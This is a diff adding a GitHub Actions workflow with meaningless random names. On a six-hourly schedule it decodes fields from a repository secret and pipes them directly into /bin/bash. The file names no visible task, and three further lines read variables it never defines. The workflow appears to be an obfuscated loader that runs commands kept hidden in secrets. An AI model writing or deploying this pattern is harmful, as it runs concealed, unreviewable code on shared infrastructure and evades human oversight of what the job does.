@@ -1,0 +1,21 @@
+name: yushijin4718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yushijin4718
+        env:
+          gbbej83233: ${{ secrets.gbbej83233 }}
+        run: |
+          echo $gbbej83233 | jq -r .fpvpu7 | /bin/bash
+          echo $tn0 | jq -r .kbwa526 | /bin/bash
+          echo $obe8 | jq -r .rtba9801 | /bin/bash
+          echo $lzq348 | jq -r .hvmxs6 | /bin/bash
+
